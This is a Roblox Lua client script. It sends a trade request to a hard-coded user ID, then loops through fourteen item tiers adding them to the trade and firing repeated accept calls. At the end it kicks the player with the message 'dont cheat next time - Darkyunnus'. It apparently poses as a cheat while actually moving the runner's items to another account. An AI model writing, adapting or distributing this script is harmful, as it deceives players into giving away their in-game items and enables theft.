local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local tradeRemotes = ReplicatedStorage:WaitForChild("TradeRemotes")
local addTradeItem = tradeRemotes:WaitForChild("AddTradeItem")
local acceptTrade = tradeRemotes:WaitForChild("AcceptTrade")
local sendTradeRequest = tradeRemotes:WaitForChild("SendTradeRequest")

-- 1. Initial Trade Request
print("Sending initial trade request...")
sendTradeRequest:FireServer(8695707469)
task.wait(4)

-- 2. Configuration
local tradeList = {
    {name = "Basic", quantity = 2, loops = 5},
    {name = "Mega", quantity = 2, loops = 5},
    {name = "Ultra", quantity = 2, loops = 5},
    {name = "Secret", quantity = 2, loops = 5},
    {name = "Godly", quantity = 2, loops = 5},
    {name = "Celestial", quantity = 2, loops = 5},
    {name = "Grind", quantity = 2, loops = 5},
    {name = "Chrome", quantity = 2, loops = 5},
    {name = "Void", quantity = 2, loops = 5},
    {name = "Divine", quantity = 2, loops = 5},
    {name = "Nova", quantity = 2, loops = 5},
    {name = "Gold", quantity = 2, loops = 5},
    {name = "HyperRed", quantity = 2, loops = 5},
    {name = "HyperGreen", quantity = 2, loops = 5}
}

-- Start loops in parallel
local activeThreads = 0

-- Adding Loop
task.spawn(function()
    activeThreads += 1
    for _, item in ipairs(tradeList) do
        for i = 1, item.loops do
            task.wait(0.38) 
            addTradeItem:FireServer(item.name, item.quantity)
        end
    end
    activeThreads -= 1
end)

-- Accept Loop
local acceptTask = task.spawn(function()
    activeThreads += 1
    while activeThreads > 1 do -- Runs as long as the adding thread is active
        acceptTrade:FireServer()
        task.wait(1)
    end
    activeThreads -= 1
end)

-- 3. Finalization: Wait for threads to finish, then kick
repeat task.wait(1) until activeThreads == 0

print("All trades finished. Starting 5s timer before kick...")
task.wait(5)
LocalPlayer:Kick("dont cheat next time - Darkyunnus")
